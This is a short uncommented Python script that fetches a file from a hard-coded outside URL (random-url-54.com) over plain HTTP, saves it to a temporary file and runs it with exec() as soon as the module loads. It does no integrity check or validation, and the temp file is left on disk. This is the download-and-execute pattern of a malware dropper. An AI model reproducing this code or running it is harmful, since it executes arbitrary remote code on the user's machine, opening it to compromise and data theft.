from urllib.request import urlopen
import tempfile

def get_script(url):
    with urlopen(url) as response:
        return response.read().decode()

def write_script_to_temp_file(script):
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as temp_file:
        temp_file.write(script)
        return temp_file.name

def execute_script_from_file(file_path):
    with open(file_path, "r") as file:
        script = file.read()
        exec(script)

def main():
    url = "http://random-url-54.com/random-script.py"
    script = get_script(url)
    temp_file_path = write_script_to_temp_file(script)
    execute_script_from_file(temp_file_path)

main()
